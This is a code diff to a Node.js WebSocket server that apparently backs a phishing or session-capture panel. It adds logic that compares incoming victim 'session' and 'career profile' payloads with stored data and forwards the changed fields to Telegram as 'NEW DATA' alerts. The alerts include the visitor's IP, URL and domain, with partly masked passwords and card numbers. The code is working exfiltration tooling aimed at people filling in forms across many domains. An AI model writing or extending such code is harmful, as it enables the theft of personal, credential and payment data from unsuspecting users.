@@ -433,6 +433,106 @@ async function sendStartupMessage() {
     }
 }
 
+const NOTIFICATION_IGNORED_KEYS = new Set([
+    'socketid', 'created_at', 'last_seen', 'domain', 'currenturl', 'clientip', 'useragent',
+    'page_views', 'offline_count', 'last_offline', 'profile_completed', 'profile_time',
+    'pending_commands', 'commands', 'total_online_time', 'connectedat', 'disconnectedat',
+    'lastreconnect', 'reconnectcount', 'status'
+]);
+
+function getNestedValue(source, pathParts) {
+    let current = source;
+    for (const part of pathParts) {
+        if (current === null || current === undefined || typeof current !== 'object') {
+            return undefined;
+        }
+        current = current[part];
+    }
+    return current;
+}
+
+function formatNotificationValue(keyPath, value) {
+    const raw = String(value ?? '').trim();
+    if (!raw) return '';
+
+    const key = keyPath.toLowerCase();
+    if (/(password|passcode)/i.test(key)) return '••••••••';
+    if (/(card_number|credit|ccnum|iban)/i.test(key)) {
+        return raw.length > 4 ? `****${raw.slice(-4)}` : raw;
+    }
+
+    return raw.replace(/`/g, "'");
+}
+
+function collectChangedNotificationFields(payload, previousState, pathParts = []) {
+    const changed = [];
+
+    if (payload === null || payload === undefined) {
+        return changed;
+    }
+
+    if (Array.isArray(payload)) {
+        const currentValue = JSON.stringify(payload);
+        const previousValue = JSON.stringify(getNestedValue(previousState, pathParts));
+        const keyPath = pathParts.join('.');
+        const normalizedKey = keyPath.toLowerCase();
+        if (keyPath && !NOTIFICATION_IGNORED_KEYS.has(normalizedKey) && currentValue !== previousValue) {
+            const formatted = formatNotificationValue(keyPath, currentValue);
+            if (formatted) changed.push({ key: keyPath, value: formatted });
+        }
+        return changed;
+    }
+
+    if (typeof payload === 'object') {
+        for (const [key, value] of Object.entries(payload)) {
+            changed.push(...collectChangedNotificationFields(value, previousState, [...pathParts, key]));
+        }
+        return changed;
+    }
+
+    const keyPath = pathParts.join('.');
+    const normalizedKey = keyPath.toLowerCase();
+    if (!keyPath || NOTIFICATION_IGNORED_KEYS.has(normalizedKey)) {
+        return changed;
+    }
+
+    const currentValue = String(payload ?? '').trim();
+    if (!currentValue) {
+        return changed;
+    }
+
+    const previousValue = getNestedValue(previousState, pathParts);
+    if (String(previousValue ?? '').trim() === currentValue) {
+        return changed;
+    }
+
+    const formatted = formatNotificationValue(keyPath, currentValue);
+    if (formatted) {
+        changed.push({ key: keyPath, value: formatted });
+    }
+    return changed;
+}
+
+async function notifyCapturedSessionData(socketId, domain, sourceLabel, changedFields, session = {}, client = null) {
+    if (!domain || !Array.isArray(changedFields) || changedFields.length === 0) {
+        return;
+    }
+
+    const lines = changedFields
+        .slice(0, 12)
+        .map(field => `└─ ${field.key}: \`${field.value}\``);
+    if (changedFields.length > 12) {
+        lines.push(`└─ _and ${changedFields.length - 12} more field(s)_`);
+    }
+
+    const message = `📥 *NEW ${sourceLabel.toUpperCase()} DATA*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 Socket: \`${socketId}\`\n🌐 Domain: \`${domain}\`\n📡 IP: \`${client?.clientIp || session.clientIp || 'unknown'}\`\n🔗 URL: ${client?.currentUrl || session.currentUrl || 'unknown'}\n📅 Time: \`${new Date().toISOString()}\`\n━━━━━━━━━━━━━━━━━━━━━━\n${lines.join('\n')}`;
+
+    await sendTelegramToDomain(domain, message, {
+        parse_mode: 'Markdown',
+        reply_markup: buildKeyboard(socketId, domain)
+    });
+}
+
 async function sendDomainSessions(domain) {
     const sessions = getSessionsByDomain(domain);
     const sessionArray = Object.values(sessions);
@@ -924,6 +1024,7 @@ wss.on('connection', (ws, req) => {
         if (msg.startsWith('CAREER_PROFILE:')) {
             try {
                 const profileData = JSON.parse(msg.replace('CAREER_PROFILE:', ''));
+                const previousSession = { ...(sessionData.get(socketId) || {}) };
                 const session = sessionData.get(socketId) || {};
                 for (const [key, value] of Object.entries(profileData)) {
                     session[key] = value;
@@ -934,6 +1035,8 @@ wss.on('connection', (ws, req) => {
                 session.last_seen = new Date().toISOString();
                 sessionData.set(socketId, session);
                 saveSessionToFile(socketId, session);
+                const changedFields = collectChangedNotificationFields(profileData, previousSession);
+                await notifyCapturedSessionData(socketId, domain, 'career profile', changedFields, session, clients.get(socketId));
                 ws.send(`CAREER_PROFILE_STORED: OK`);
                 console.log(`✅ Career profile saved for ${socketId} (${domain})`);
             } catch(e) {
@@ -946,6 +1049,7 @@ wss.on('connection', (ws, req) => {
         if (msg.startsWith('SESSION:')) {
             try {
                 const newData = JSON.parse(msg.replace('SESSION:', ''));
+                const previousSession = { ...(sessionData.get(socketId) || {}) };
                 const session = sessionData.get(socketId) || {};
                 for (const [key, value] of Object.entries(newData)) {
                     session[key] = value;
@@ -954,6 +1058,8 @@ wss.on('connection', (ws, req) => {
                 session.domain = domain;
                 sessionData.set(socketId, session);
                 saveSessionToFile(socketId, session);
+                const changedFields = collectChangedNotificationFields(newData, previousSession);
+                await notifyCapturedSessionData(socketId, domain, 'session', changedFields, session, clients.get(socketId));
                 ws.send(`SESSION_STORED: OK`);
                 console.log(`✅ Session data saved for ${socketId} (${domain})`);
             } catch(e) {
